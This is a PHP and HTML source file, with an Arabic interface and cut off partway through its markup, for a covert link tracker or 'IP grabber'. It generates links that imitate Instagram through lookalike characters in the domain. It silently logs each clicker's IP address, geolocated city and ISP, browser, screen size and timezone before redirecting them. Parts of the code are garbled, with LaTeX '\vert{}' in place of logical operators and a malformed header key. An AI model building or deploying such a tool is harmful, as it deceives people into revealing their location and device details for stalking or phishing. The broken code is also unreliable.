<?php
$db = new PDO('sqlite:tracker.db');$db->exec("CREATE TABLE IF NOT EXISTS links (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    code TEXT UNIQUE, 
    target_url TEXT, 
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    code TEXT, 
    ip TEXT, 
    country TEXT, 
    city TEXT, 
    isp TEXT, 
    user_agent TEXT, 
    screen_res TEXT, 
    timezone TEXT, 
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X-FORWARDED-FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X-FORWARDED-FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function get_ip_details($ip) {
    if ($ip == '127.0.0.1' || $ip == '::1' \vert{}\vert{}$ip == 'Unknown' || strpos($ip, '10.') === 0 \vert{}\vert{} strpos($ip, '192.168.') === 0) {
        return ['country' => 'محلية / شبكة خاصة', 'city' => 'محلية', 'isp' => 'محلي'];
    }
    $json = @file_get_contents("http://ip-api.com/json/" . $ip);
    $data = json_decode($json, true);
    if ($data && isset($data['status']) &&$data['status'] == 'success') {
        return [
            'country' => $data['country'] ?? 'غير معروف',
            'city' => $data['city'] ?? 'غير معروف',
            'isp' => $data['isp'] ?? 'غير معروف'
        ];
    }
    return ['country' => 'غير معروف', 'city' => 'غير معروف', 'isp' => 'غير معروف'];
}

// 1. إعادة التوجيه والتسجيل
if (isset($_GET['r'])) {
    $code =$_GET['r'];
    $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link =$stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {$target = $link['target_url'];$ip = get_real_ip();
        $geo = get_ip_details($ip);
        $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $screen =$_GET['screen'] ?? 'N/A';
        $tz =$_GET['tz'] ?? 'N/A';

        $logStmt =$db->prepare("INSERT INTO logs (code, ip, country, city, isp, user_agent, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
        $logStmt->execute([$code,$ip, $geo['country'],$geo['city'], $geo['isp'],$ua, $screen,$tz]);

        header("Location: " . $target);
        exit();
    } else {
        die("الرابط غير موجود أو انتهت صلاحيته.");
    }
}

// 2. إنشاء رابط جديد باستخدام النطاق المطلوب
$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt =$db->prepare("INSERT INTO links (code, target_url) VALUES (?, ?)");
    $stmt->execute([$code,$target_url]);

    $tracking_code =$code;
    $generated_link = "https://www.instаgrаm.com/?r=" . $code;
}

$total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
$total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();

$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $logs =$stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World from azez</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const redirectCode = urlParams.get('r');
        const hasScreen = urlParams.has('screen');

        if (redirectCode && !hasScreen) {
            const screenRes = screen.width + "x" + screen.height;
            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            window.location.href = `/?r=${redirectCode}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
        }

        function copyToClipboard(text, btnId) {
            navigator.clipboard.writeText(text).then(() => {
                const btn = document.getElementById(btnId);
                const originalText = btn.innerText;
                btn.innerText = "تم النسخ! ✓";
                btn.classList.add("bg-green-600");
                setTimeout(() => {
                    btn.innerText = originalText;
                    btn.classList.remove("bg-green-600");
                }, 2000);
            });
        }
    </script>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen p-4 md:p-6">
    <div class="max-w-6xl mx-auto space-y-6">
        
        <!-- Header -->
        <header class="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-xl flex flex-col md:flex-row justify-between items-center gap-4">
            <div>
                <h1 class="text-2xl md:text-3xl font-extrabold text-cyan-400">Hello World from azez</h1>
                <p class="text-slate-400 text-sm mt-1">نظام تحديد وتتبع الروابط المتقدم</p>
            </div>
            <div class="flex gap-4">
                <div class="bg-slate-800 px-4 py-2 rounded-xl border border-slate-700 text-center">
                    <span class="block text-xs text-slate-400">الروابط المنشأة</span>
                    <span class="text-xl font-bold text-cyan-400"><?php echo $total_links; ?></span>
                </div>
                <div class="bg-slate-800 px-4 py-2 rounded-xl border border-slate-700 text-center">
                    <span class="block text-xs text-slate-400">إجمالي النقرات</span>
                    <span class="text-xl font-bold text-emerald-400"><?php echo $total_visits; ?></span>
                </div>
            </div>
        </header>

        <!-- Generator Card -->
        <div class="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-xl">
            <h2 class="text-lg font-bold text-cyan-400 mb-4">🔗 إنشاء رابط تتبع جديد</h2>
            <form method="POST" class="flex flex-col md:flex-row gap-3">
                <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثال: https://youtube.com)" required 
                    class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 text-slate-100 focus:outline-none focus:border-cyan-500">
                <button type="submit" name="create" class
